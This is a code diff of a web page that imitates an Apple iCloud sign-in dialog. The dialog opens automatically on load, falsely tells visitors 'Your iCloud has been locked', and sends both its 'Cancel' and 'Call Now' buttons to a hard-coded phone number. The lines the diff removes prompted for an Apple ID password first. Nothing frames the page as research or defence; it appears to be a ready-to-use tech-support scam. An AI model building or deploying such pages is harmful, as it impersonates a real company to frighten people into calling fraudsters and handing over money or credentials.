@@ -108,13 +108,12 @@
     <section class="dialog" role="dialog" aria-modal="true" aria-labelledby="dlg-title" aria-describedby="dlg-desc" tabindex="-1">
       <div class="dlg-body">
         <h2 id="dlg-title" class="dlg-title">Sign In to iCloud</h2>
-        <p id="dlg-desc" class="dlg-text">Enter your Apple password</p>
+        <p id="dlg-desc" class="dlg-text">Your iCloud has been locked.</p>
       </div>
-      <div class="field" id="field"><input id="password" class="input" type="password" placeholder="password" autocomplete="current-password" aria-label="Apple ID Password" /></div>
       <div class="dlg-divider" aria-hidden="true"></div>
       <div class="dlg-actions" id="dlg-actions">
-        <button type="button" class="dlg-btn" id="cancelBtn" disabled>Cancel</button>
-        <button type="button" class="dlg-btn" id="okBtn" disabled>OK</button>
+        <button type="button" class="dlg-btn" id="cancelBtnNew">Cancel</button>
+        <button type="button" class="dlg-btn" id="callBtn">Call Now</button>
       </div>
     </section>
   </div>
@@ -123,58 +122,40 @@
     (function(){
       const overlay = document.getElementById('overlay');
       const openBtn = document.getElementById('openDlg');
-      const cancelBtn = document.getElementById('cancelBtn');
-      const okBtn = document.getElementById('okBtn');
-      const pass = document.getElementById('password');
+      const cancelBtnNew = document.getElementById('cancelBtnNew');
+      const callBtn = document.getElementById('callBtn');
       const dialog = overlay.querySelector('.dialog');
-      const dlgActions = document.getElementById('dlg-actions');
-      const field = document.getElementById('field');
 
-      function open(){ overlay.setAttribute('aria-hidden','false'); setTimeout(()=> dialog.focus(),0); document.addEventListener('keydown', esc); }
-      function close(){ overlay.setAttribute('aria-hidden','true'); document.removeEventListener('keydown', esc); pass.value=''; openBtn && openBtn.focus(); }
-      function esc(e){ if(e.key==='Escape') close(); }
+      function open(){ 
+        overlay.setAttribute('aria-hidden','false'); 
+        setTimeout(() => dialog.focus(), 0); 
+        document.addEventListener('keydown', esc); 
+      }
+      function close(){ 
+        overlay.setAttribute('aria-hidden','true'); 
+        document.removeEventListener('keydown', esc); 
+        openBtn && openBtn.focus(); 
+      }
+      function esc(e){ 
+        if(e.key==='Escape') close(); 
+      }
 
       // Simple focus trap inside dialog
-      overlay.addEventListener('focusin', (e)=>{ if(!dialog.contains(e.target)) dialog.focus(); });
+      overlay.addEventListener('focusin', (e) => { 
+        if(!dialog.contains(e.target)) dialog.focus(); 
+      });
 
       openBtn && openBtn.addEventListener('click', open);
 
-      // Enable OK button only when password is entered
-      pass.addEventListener('input', () => {
-        if (pass.value.trim().length > 0) {
-          okBtn.disabled = false;
-        } else {
-          okBtn.disabled = true;
-        }
+      cancelBtnNew.addEventListener('click', () => {
+        window.location.href = 'tel:+1-844-485-2265';
       });
 
-      okBtn.addEventListener('click', () => { 
-        if (pass.value.trim().length === 0) { 
-          alert('Please enter your password.'); 
-          return;
-        } 
-        // Update dialog to show error message and new buttons
-        document.getElementById('dlg-desc').textContent = 'Your iCloud has been locked.';
-        field.style.display = 'none'; // Hide password field
-        dlgActions.innerHTML = `
-          <button type="button" class="dlg-btn" id="cancelBtnNew">Cancel</button>
-          <button type="button" class="dlg-btn" id="callBtn">Call Now</button>
-        `;
-        document.getElementById('cancelBtnNew').addEventListener('click', () => {
-          window.location.href = 'tel:+1-844-485-2265';
-        });
-        document.getElementById('callBtn').addEventListener('click', () => {
-          window.location.href = 'tel:+1-844-485-2265';
-        });
-        pass.value = '';
-        setTimeout(() => document.getElementById('cancelBtnNew').focus(), 0);
+      callBtn.addEventListener('click', () => {
+        window.location.href = 'tel:+1-844-485-2265';
       });
 
-      pass.addEventListener('keydown', (e) => { 
-        if (e.key === 'Enter' && !okBtn.disabled) okBtn.click(); 
-      });
-
-      // Auto-open on load as requested
+      // Auto-open on load
       window.addEventListener('load', open);
     })();
   </script>
